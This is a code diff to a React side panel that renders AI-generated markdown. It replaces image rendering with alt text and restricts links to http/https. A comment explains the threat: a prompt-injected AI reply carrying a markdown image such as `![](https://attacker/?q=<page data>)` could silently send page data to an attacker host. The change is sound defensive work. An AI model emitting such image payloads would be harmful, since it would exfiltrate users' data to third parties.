@@ -73,9 +73,21 @@ interface SidePanelProps {
  * identity; building either object inline inside the render body defeats that
  * memo and re-parses the whole transcript on every streaming tick (~20x/s).
  */
-const MARKDOWN_REMARK_PLUGINS = [remarkGfm];
+export const MARKDOWN_REMARK_PLUGINS = [remarkGfm];
 
-const MARKDOWN_COMPONENTS: Components = {
+/**
+ * Exported for tests. AI output is untrusted, and a prompt-injected reply can
+ * carry `![](https://attacker/?q=<page data>)`: rendering it as <img> would
+ * load that URL from the privileged main window (the production CSP allows
+ * img-src https:) and leak the data without a click. Images are therefore
+ * never loaded; only their alt text is shown.
+ */
+export const MARKDOWN_COMPONENTS: Components = {
+  img: ({ alt }) => (
+    <span className="opacity-60 italic break-words">
+      [{alt || l({ en: 'image', ar: 'صورة', de: 'Bild' })}]
+    </span>
+  ),
   a: ({ href, children }) => {
     // AI output is untrusted: only render http and https protocols as clickable links.
     if (!href || !isSafeNavigationUrl(href) || !/^https?:\/\//i.test(href)) {
